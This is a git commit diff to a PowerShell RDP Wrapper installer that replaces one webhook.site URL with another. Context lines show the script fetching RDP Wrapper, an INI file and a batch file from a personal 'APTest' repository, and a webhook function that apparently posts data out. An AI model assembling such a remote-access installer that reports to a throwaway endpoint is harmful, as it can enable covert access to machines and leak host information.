b6fd0f3c823ee4487e600f9e0be3a9930aed6969
apex30258-sys <apex30258@gmail.com>
2026-08-12 06:22:20 +1000

    InstallRDPWrapper.ps1

--- InstallRDPWrapper.ps1
+++ InstallRDPWrapper.ps1
@@ -82,7 +82,7 @@ $rdpConf     = Join-Path $installPath "RDPConf.exe"
 $zipUrl       = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"
 $customIniUrl = "https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/refs/heads/master/rdpwrap.ini"
 $srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
-$webhookUrl   = "https://webhook.site/b070bb97-926a-4b24-95f9-cf031e50be3e"
+$webhookUrl   = "https://webhook.site/e561b9eb-b606-4834-994b-66f0171d260f"
 
 # ============================================================
 # Webhook Function (Pre-converts to JSON to preserve order)
